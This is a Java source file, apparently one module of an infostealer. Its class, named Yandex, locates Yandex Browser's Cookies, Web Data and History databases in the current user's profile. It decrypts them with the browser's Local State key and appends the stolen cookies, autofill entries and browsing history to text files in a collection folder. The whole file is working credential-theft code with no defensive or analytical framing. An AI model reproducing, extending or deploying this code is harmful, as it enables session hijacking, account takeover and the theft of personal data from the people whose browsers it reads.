package _256.node.nodes.impl.browser;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;

import _256.node.Category;
import _256.node.Node;
import _256.utils.decrypt.autofill.AutoFillDecrypt;
import _256.utils.decrypt.cookie.CookieDecrypt;
import _256.utils.decrypt.history.HistoryDecrypt;

public class Yandex extends Node {

	public Yandex() {
		super(Category.FILE);
	}

	@Override
	public void createNode() throws IOException {
		if (new File("C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Default\\Cookies").exists()) {
			cookie();
		}
		if (new File("C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Default\\Web Data").exists()) {
			autoFill();
			history();
		}
	}

	public void autoFill() throws IOException {
		if (!new AutoFillDecrypt("C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Default\\Web Data", "C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Local State").getAutoFill().getData().isEmpty()) {
			FileWriter writer = new FileWriter(mergePath(getFolder(), "General" + "\\" + "AutoFills.txt"), true);
			BufferedWriter bufferedWriter = new BufferedWriter(writer);
			bufferedWriter.write(new AutoFillDecrypt("C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Default\\Web Data", "C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Local State").getAutoFill().getData());
			bufferedWriter.close();
		}
	}

	public void cookie() throws IOException {
		if (new File("C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Default\\Cookies").exists()) {
			FileWriter writer = new FileWriter(mergePath(getFolder(), "Cookies") + "\\" + "Yandex.txt", true);
			BufferedWriter bufferedWriter = new BufferedWriter(writer);
			bufferedWriter.write(new CookieDecrypt("C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Default\\Cookies", "C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Local State").getCookies().getData());
			bufferedWriter.close();
		}
	}

	public void history() throws IOException {
		if (!new HistoryDecrypt("C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Default\\History", "C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Local State").getHistory().getData().isEmpty()) {
			FileWriter writer = new FileWriter(mergePath(getFolder(), "General" + "\\" + "History.txt"), true);
			BufferedWriter bufferedWriter = new BufferedWriter(writer);
			bufferedWriter.write(new HistoryDecrypt("C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Default\\History", "C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Local State").getHistory().getData());
			bufferedWriter.close();
		}
	}
}